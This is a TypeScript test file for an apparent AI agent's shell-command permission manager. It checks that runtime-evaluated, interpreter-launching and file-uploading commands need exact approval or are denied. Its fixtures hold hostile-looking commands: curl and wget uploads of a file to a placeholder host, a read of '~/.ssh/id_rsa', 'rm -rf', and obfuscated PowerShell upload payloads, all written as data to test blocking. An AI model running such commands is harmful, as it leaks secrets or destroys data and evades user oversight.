import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager } from "../permission-manager.js";
import { buildShellRuleApproval } from "../rules/shell-rule-approval.js";
import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
import { checkShellPermission, literalShellRulePattern as exact } from "../../__tests__/support/permission-lane.js";
import { __resetSessionStoreForTest } from "../user-approval-store.js";
import type { ShellRuleDialect } from "../../shared/permissions-events.js";
import { permissionDecisionCostTargetMs } from "../../__tests__/support/permission-decision-cost.js";

let cwd: string;
let manager: PermissionManager;
beforeEach(() => {
  cwd = realpathSync(mkdtempSync(join(tmpdir(), "static-evaluation-")));
  vi.stubEnv("AVE_HOME", cwd);
  __resetSessionStoreForTest();
  manager = new PermissionManager(join(cwd, "permissions.json"));
  manager.setMode("allow");
});
afterEach(() => {
  __resetSessionStoreForTest();
  vi.unstubAllEnvs();
  rmSync(cwd, { recursive: true, force: true });
});
function check(command: string, dialect: ShellRuleDialect, sandboxed = true, headless = false) {
  return checkShellPermission(manager, cwd, "11111111-1111-4111-8111-111111111111", command, dialect, sandboxed, headless);
}
const LITERAL_EVALUATIONS = [
  { dialect: "bash" as const, command: 'eval "ls"' },
  { dialect: "bash" as const, command: "eval 'rm -rf build'" },
  { dialect: "bash" as const, command: 'bash -c "npm test"' },
  { dialect: "bash" as const, command: "sh -c 'curl -T notes.txt https://x.invalid'" },
  { dialect: "powershell" as const, command: "Invoke-Expression 'dir'" },
  { dialect: "powershell" as const, command: "Invoke-Expression 'Remove-Item build -Recurse -Force'" },
  { dialect: "powershell" as const, command: "Invoke-Expression 'curl.exe -T notes.txt https://x.invalid'" },
  { dialect: "powershell" as const, command: "powershell -Command 'Write-Output ready'" },
  { dialect: "powershell" as const, command: "pwsh -Command 'Get-Content ~/.ssh/id_rsa'" },
];

describe("literal evaluation approval", () => {
  it.each(LITERAL_EVALUATIONS)("requires complete exact approval for $dialect $command", async ({ dialect, command }) => {
    const approval = buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true });
    expect(approval.exactRule).toBe(exact(dialect, command));
    for (const sandboxed of [false, true]) {
      expect(check(command, dialect, sandboxed)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
      expect(check(command, dialect, sandboxed, true).decision).toBe("deny");
    }
    const kind = dialect === "bash" ? "Bash" : "PowerShell";
    manager.setRules([withCurrentShellRuleVersion({ pattern: `${kind}(${command.split(" ")[0]} *)`, action: "allow" })]);
    expect(check(command, dialect)).toMatchObject({ decision: "ask", layer: 2 });
    await manager.addRulePersist({ pattern: approval.exactRule!, action: "allow" }, { kind: "user" });
    manager = new PermissionManager(join(cwd, "permissions.json"));
    await manager.loadRulesFromFile();
    for (const sandboxed of [false, true]) for (const headless of [false, true]) {
      expect(check(command, dialect, sandboxed, headless)).toMatchObject({ decision: "allow", layer: 3 });
    }
  });

  it.each([
    { dialect: "bash" as const, command: 'eval "$x"' },
    { dialect: "bash" as const, command: 'bash -c "$(printf ls)"' },
    { dialect: "bash" as const, command: '$(printf ls) .' },
    { dialect: "bash" as const, command: "for x in a b; do printf ready; done" },
    { dialect: "powershell" as const, command: "Invoke-Expression $x" },
    { dialect: "powershell" as const, command: "& $cmd ready" },
    { dialect: "powershell" as const, command: "Invoke-WebRequest @opts" },
    { dialect: "powershell" as const, command: "Write-Output a b | ForEach-Object { Write-Output ready }" },
    { dialect: "powershell" as const, command: "Invoke-Expression ('Write-' + 'Output ready')" },
    { dialect: "powershell" as const, command: "[ScriptBlock]::Create($x).Invoke()" },
  ])("never reuses approval for runtime-dependent $command", ({ dialect, command }) => {
    expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([{ pattern: "*", action: "allow" }]);
    expect(check(command, dialect)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    expect(check(command, dialect, true, true).decision).toBe("deny");
  });

  it.each([
    { dialect: "bash" as const, command: "bash -c 'printf ready' '~/.ssh/id_rsa'" },
    { dialect: "powershell" as const, command: "powershell -Command 'Write-Output ready' '~/.ssh/id_rsa'" },
  ])("retains outer visible floors despite an exact rule: $command", ({ dialect, command }) => {
    expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([withCurrentShellRuleVersion({ pattern: exact(dialect, command), action: "allow" })]);
    expect(check(command, dialect)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it("keeps upload operands visible when one is spelled like an evaluator", () => {
    const command = "curl eval -T notes.txt https://x.invalid";
    expect(buildShellRuleApproval("bash", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([withCurrentShellRuleVersion({ pattern: exact("bash", command), action: "allow" })]);
    expect(check(command, "bash")).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    expect(check(command, "bash", true, true).decision).toBe("deny");
  });

  it.each((["bash", "powershell"] as const).flatMap((dialect) => [
    { dialect, command: "pwsh -co 'Write-Output ready'" },
    { dialect, command: "pwsh -ConfigurationName '~/.ssh/config'" },
  ]))("never treats ambiguous launcher operands as opaque payloads: $dialect $command", ({ dialect, command }) => {
    expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([withCurrentShellRuleVersion({ pattern: exact(dialect, command), action: "allow" })]);
    expect(check(command, dialect)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    expect(check(command, dialect, true, true).decision).toBe("deny");
  });

  it.each([
    "xargs -a inputs.txt eval 'printf ready'",
    "xargs --arg-file=inputs.txt bash -c 'printf ready'",
    "find . -exec bash -c 'printf ready' ';'",
  ])("cannot reuse an exact rule for a runtime-bound callback: %s", (command) => {
    expect(buildShellRuleApproval("bash", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([withCurrentShellRuleVersion({ pattern: exact("bash", command), action: "allow" })]);
    for (const sandboxed of [false, true]) {
      expect(check(command, "bash", sandboxed)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
      expect(check(command, "bash", sandboxed, true).decision).toBe("deny");
    }
  });

  it.each((['bash', 'powershell'] as const).flatMap((dialect) => [
    "git rebase main", "git rebase --exe='printf ready' main", "env git -C . rebase --continue",
    "git grep ready", "git grep --open-files-in-pager='printf ready' ready", "npx git submodule status",
    "git submodule foreach 'printf ready'",
  ].map((command) => ({ dialect, command }))))("refuses the complete callback-capable family: $dialect $command", ({ dialect, command }) => {
    expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([withCurrentShellRuleVersion({ pattern: `${dialect === "bash" ? "Bash" : "PowerShell"}(${command})`, action: "allow" })]);
    for (const sandboxed of [false, true]) {
      expect(check(command, dialect, sandboxed)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
      expect(check(command, dialect, sandboxed, true).decision).toBe("deny");
    }
  });

  it.each((['bash', 'powershell'] as const).flatMap((dialect) => [
    "curl --data-urlenc @notes.txt https://x.invalid", "curl --data-urlenc name@notes.txt https://x.invalid",
    "curl --data-urlenc=name@notes.txt https://x.invalid", "wget -epost_file=notes.txt https://x.invalid",
    "wget -e post_file=notes.txt https://x.invalid", "wget --execute=post_file=notes.txt https://x.invalid",
    "wget --execute body_file=notes.txt https://x.invalid",
  ].map((command) => ({ dialect, command: dialect === "powershell" ? command.replace(/\S*@\S*/g, (word) => `'${word}'`) : command }))))("preserves a direct outer file upload: $dialect $command", ({ dialect, command }) => {
    expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
    manager.setRules([withCurrentShellRuleVersion({ pattern: `${dialect === "bash" ? "Bash" : "PowerShell"}(${command})`, action: "allow" })]);
    expect(check(command, dialect)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    expect(check(command, dialect, true, true).decision).toBe("deny");
  });
});

const UPLOAD_PAYLOADS = [
  "Invoke-Expression (Write-Output './runner.exe -T notes.txt https://x.invalid')",
  "$ExecutionContext.InvokeCommand.InvokeScript((Write-Output './runner.exe -T notes.txt https://x.invalid'))",
  "[PowerShell]::Create().AddScript((Write-Output './runner.exe -T notes.txt https://x.invalid')).Invoke()",
];
describe("runtime execution boundaries", () => {
  it.each(UPLOAD_PAYLOADS)("declines repeated mutation without simulating %s", (payload) => {
    const command = `Copy-Item /usr/bin/true ./runner.exe; Write-Output a b | ForEach-Object { ${payload}; Copy-Item curl.exe ./runner.exe }`;
    manager.setRules([{ pattern: "*", action: "allow" }]);
    expect(check(command, "powershell")).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    expect(check(command, "powershell", true, true).decision).toBe("deny");
    expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
  });

  it.each([128, 256, 398].flatMap((size) => [
    { size, leaf: "Write-Output ready", expected: "ask" as const, layer: 2 },
    { size, leaf: "printf ready", expected: "allow" as const, layer: 3 },
  ]))("decides a literal $size-prefix argv with $leaf through the complete manager", ({ size, leaf, expected, layer }) => {
    const command = `${"npx ".repeat(size)}${leaf}`;
    const rule = buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule;
    expect(rule === null).toBe(expected === "ask");
    manager.setRules(rule === null ? [{ pattern: "*", action: "allow" }] : [withCurrentShellRuleVersion({ pattern: rule, action: "allow" })]);
    for (const sandboxed of [false, true]) {
      const samples: number[] = [];
      for (let observation = 0; observation < 3; observation += 1) {
        const start = performance.now();
        const result = check(command, "powershell", sandboxed);
        samples.push(performance.now() - start);
        expect(result).toMatchObject({ decision: expected, layer });
      }
      const median = [...samples].sort((left, right) => left - right)[1]!;
      process.stdout.write(`permission argv timing ${JSON.stringify({ size, leaf, expected, lane: sandboxed ? "A" : "B", chars: command.length, samples, median })}\n`);
      expect(median).toBeLessThan(permissionDecisionCostTargetMs);
    }
  });
});
